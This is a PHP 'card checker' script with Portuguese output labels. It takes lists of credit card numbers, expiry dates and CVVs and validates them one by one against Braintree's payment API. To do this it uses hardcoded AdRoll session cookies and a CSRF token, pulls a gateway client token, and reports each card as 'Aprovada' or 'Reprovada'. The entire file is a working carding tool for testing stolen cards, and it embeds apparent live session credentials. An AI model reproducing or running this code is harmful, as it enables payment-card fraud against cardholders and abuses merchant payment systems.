<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

## PEGAR COOKIES DO APP.ADROLL.COM E A URL https://app.adroll.com/payment-methods/?advertisable=ADVERTISABLE&account=ACCOUNT_ID&hide_buttons=false&set_primary=false

$email = 'cyberang'.rand(10, 100000).'%40gmail.com';
$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$mes2 = (string)((int)$mes);
$ano = $separar[2];
$ano2 = substr($ano, -2);
$cvv = $separar[3];

if (file_exists("cyberang.txt")) {
    unlink("cyberang.txt");
}

$digito = substr($cc, 0, 1);
if($digito == 4){
  $brand = 'visa';
}elseif($digito == 5){
  $brand = 'mastercard';
}elseif($digito == 2){
  $brand = 'mastercard';
}elseif($digito == 6){
  $brand = 'elo';
}elseif($digito == 3){
  $brand = 'amex';
}else{
  $brand = 'unknown';
}

function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
  $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
  echo "<div style='
      font-family: \"JetBrains Mono\", \"Courier New\", monospace;
      background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
      border-left: 2px solid $cor;
      padding: 14px 18px;
      margin: 4px 0;
      border-radius: 0 6px 6px 0;
      letter-spacing: 0.3px;
      font-size: 12.5px;
      box-shadow: 0 0 20px $bg;
  '>
      <span style='color: $cor; margin-right: 4px;'>$icone</span>
      <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
      <span style='color: #8f9199; margin: 0 4px;'>↝</span>
      <span style='color: $cormsg;'>$mensagem</span>
      <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
  </div>";
}

$account_id = 'NHBTQAVTKVFZJOEXXO7OCN';
$advertisable = 'BXG6VGX625G4XDCL3B2GYD';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://app.adroll.com/api/v1/account/gateway_credentials/$account_id?_escape=false");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'Accept: */*',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie: _vwo_uuid_v2=D3A51DDA45EC7D3620722D02B19459A81|50dae651c557e7d55fb1ce7a2645d470; ajs_anonymous_id=5ab3c69f-05b5-4e2e-bbef-16315140511d; __q_state_7vRZXDoErqRN486q=eyJ1dWlkIjoiYzlhMWJiOTUtN2E5NS00OTNjLWJmOTQtMmY5NDI1MTc5M2MyIiwiY29va2llRG9tYWluIjoiYWRyb2xsLmNvbSIsIm1lc3NlbmdlckV4cGFuZGVkIjpmYWxzZSwicHJvbXB0RGlzbWlzc2VkIjpmYWxzZSwiY29udmVyc2F0aW9uSWQiOiIxODUxNjA3NjU3OTU2Mzc3Nzk2In0=; _vwo_uuid=D3150774C304418CEA0F3B7ACE1697F20; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_ds=3%3At_0%2Ca_0%3A0%241771290334%3A94.97991608%3A%3A%3A%3A1%3A1771290334%3A1771290334%3A1; _reb2buid=b163d812-e7f3-4047-ad23-0f71aa83abc7; _reb2bsessionID=wMtdhkYE7FweVIuahcKHYvLi; _reb2bgeo=%7B%22city%22%3A%22Belo%20Horizonte%22%2C%22country%22%3A%22Brazil%22%2C%22countryCode%22%3A%22BR%22%2C%22hosting%22%3Afalse%2C%22isp%22%3A%22Claro%20NXT%20Telecomunicacoes%20Ltda%22%2C%22lat%22%3A-19.9029%2C%22proxy%22%3Afalse%2C%22region%22%3A%22MG%22%2C%22regionName%22%3A%22Minas%20Gerais%22%2C%22status%22%3A%22success%22%2C%22timezone%22%3A%22America%2FSao_Paulo%22%2C%22zip%22%3A%2230000%22%7D; receive-cookie-deprecation=1; __adroll_fpc=8d5ae13947f68f73d984bf899105da06-1771290343534; _clck=1slvi3q%7C2%7Cg3n%7C1%7C1598; __q_state_ZFTcG3Wxwf4bL5Am=eyJ1dWlkIjoiNTdhOWM0ZDYtZWZlMC00N2YxLThhM2QtNjFiYjBkZjlhNjMyIiwiY29va2llRG9tYWluIjoiYWRyb2xsLmNvbSIsIm1lc3NlbmdlckV4cGFuZGVkIjpmYWxzZSwicHJvbXB0RGlzbWlzc2VkIjpmYWxzZSwiY29udmVyc2F0aW9uSWQiOiIxODUxNjA3ODE5NjIwMjYzMTQ5In0=; __adroll_consent=CQfxNsAQfxNsAAAACBPTAOFv_____0P__yiQASv_____4ASv_____4AA.IASu8F-A34A%23VMYZUWPHFRH37EAOEU2EQS; __NEXTROLL_CONSENT=%2C1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C; __adroll_shared=aab6b78bce5cb165e427804cfe983477-g_1771290354-a_1770318647; g_state={"i_l":0,"i_ll":1771290405732,"i_e":{"enable_itp_optimization":15},"i_b":"/WgzAC419NiEdgQu+BnHtwg6BiAUvIK0O91fIUDL+r4"}; _gid=GA1.2.1617318865.1771290406; _gcl_au=1.1.1099800184.1771290323.625030561.1771290425.1771290425; csrftoken=a29dad3a9a90388a90c1ad554f42d5ad; adroll=bea00aaa2bcc2cf5db4e16b3c2aeb23c1b9ca4ce028351138a5142a885dfe5bb0f9810ed; _ga=GA1.1.1824566914.1771290322; _ga_6SC9FJGD9R=GS2.1.s1771290321$o1$g1$t1771290589$j60$l0$h1767125423; __zlcmid=1W9oISIdrzF2lJm; __ar_v4=VMYZUWPHFRH37EAOEU2EQS%3A20260219%3A11%7C47TO2ID2HZGCXBUDT6O72I%3A20260219%3A11; _vwo_sn=0%3A26%3A%3A%3A%3A%3A285; AWSALB=1fSk/FlChO1R7v1pCXVMStrcwCqLmmEqyoRc80HMbHlB8uY5DrM7JxrU1PZVf0BuAjO8X7bDkgdjorTmoRj81BdAVVkvwjt64I2gyMKC7zjNA76qdbyfibLKMTX1; _ga_Z6V9VWD6DL=GS2.1.s1771290336$o1$g1$t1771290792$j16$l0$h1545932394; _clsk=1pbomdt%7C1771290797602%7C24%7C1%7C; _dd_s=rum=1&id=ee43e285-8b74-4bf3-aef0-ca68e605552d&created=1771290349605&expire=1771291742240',
"Referer: https://app.adroll.com/payment-methods/?advertisable=$advertisable&account=$account_id&hide_buttons=false&set_primary=false&lang=en_US",
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
'X-CSRF-Token: 6979effe1919b2fc2a82773766a3a367',
'sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"'
]);
$response = curl_exec($ch);
$clientToken = json_decode(base64_decode(json_decode($response, true)['results']['braintree_client_token']), true);

$bearer = explode('?', $clientToken['authorizationFingerprint'])[0];
$sessionId = bin2hex(random_bytes(16));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/527r4khfxhmb694m/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=3.98.2&authorizationFingerprint=' . urlencode($bearer) . '%3Fcustomer_id%3D&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=' . $sessionId . '&share=undefined&&creditCard%5Bnumber%5D=' . $cc . '&creditCard%5BexpirationDate%5D=' . $mes . '%2F' . $ano . '&creditCard%5Bcvv%5D=' . $cvv . '&creditCard%5Boptions%5D%5Bvalidate%5D=true&_method=POST&callback=callback_json02178bb076b649fc90cb4090f031a2a6');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cyberang.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cyberang.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Referer: https://app.adroll.com/',
'User-Agent:' . $useragent
));
$resultado = curl_exec($ch);

if(strpos($resultado, 'nonce') !== false) {
  cyber("💸", "Aprovada", $lista, "[ Cartão vinculado com sucesso. ]");

}elseif(strpos($resultado, 'error') !== false) {
  cyber("❌", "Reprovada", $lista, "[ Cartão recusado pelo emissor. ]", "#ff3366", "#ff3366");

}else{
  cyber("❌", "Reprovada", $lista, "[ Erro Desconhecido. ]", "#ff3366", "#ff3366");
}
?>
